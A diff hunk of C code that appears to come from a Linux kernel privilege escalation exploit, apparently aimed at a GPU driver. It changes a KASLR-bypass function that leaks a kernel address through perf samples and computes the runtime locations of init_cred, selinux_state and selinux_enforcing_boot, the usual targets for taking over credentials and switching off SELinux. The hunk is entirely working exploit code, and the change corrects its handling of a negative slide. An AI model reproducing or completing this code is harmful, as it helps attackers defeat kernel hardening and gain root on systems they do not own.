@@ -78,15 +78,24 @@ static uint64_t detect_kaslr(uint64_t *init_cred_out, uint64_t *selinux_state_ou
     munmap(buf, mmap_size); close(fd);
     printf("    kernel_samples=%d\n", n_ips);
 
-    if (n_ips == 0) { printf("  perf: no kernel IPs\n"); return 0; }
+    if (n_ips == 0 || first_kernel_ip == 0) { printf("  perf: no kernel IPs\n"); return 0; }
 
-    uint64_t kaslr = (first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL;
-    *init_cred_out = VMLINUX_INIT_CRED + kaslr;
-    *selinux_state_out = VMLINUX_SELINUX_STATE + kaslr;
-    *enforcing_out = VMLINUX_SELINUX_ENFORCING_BOOT + kaslr;
-    printf("    first_kernel_ip=0x%lX kaslr=0x%lX init_cred=0x%lX\n",
-        (unsigned long)first_kernel_ip, (unsigned long)kaslr, (unsigned long)*init_cred_out);
-    return kaslr;
+    int64_t kaslr;
+    if (first_kernel_ip >= VMLINUX_TEXT) {
+        kaslr = (int64_t)((first_kernel_ip - VMLINUX_TEXT) & ~0x1FFFFFULL);
+    } else {
+        kaslr = -(int64_t)((VMLINUX_TEXT - first_kernel_ip) & ~0x1FFFFFULL);
+    }
+
+    *init_cred_out = (uint64_t)((int64_t)VMLINUX_INIT_CRED + kaslr);
+    *selinux_state_out = (uint64_t)((int64_t)VMLINUX_SELINUX_STATE + kaslr);
+    *enforcing_out = (uint64_t)((int64_t)VMLINUX_SELINUX_ENFORCING_BOOT + kaslr);
+
+    printf("    kaslr=%ld (0x%lX)\n", kaslr, (unsigned long)kaslr);
+    printf("    init_cred=0x%lX\n", (unsigned long)*init_cred_out);
+    printf("    selinux_state=0x%lX\n", (unsigned long)*selinux_state_out);
+    printf("    enforcing_boot=0x%lX\n", (unsigned long)*enforcing_out);
+    return (uint64_t)kaslr;
 }
 
 static int gpuobj_alloc(int fd, uint64_t size, uint64_t flags) {
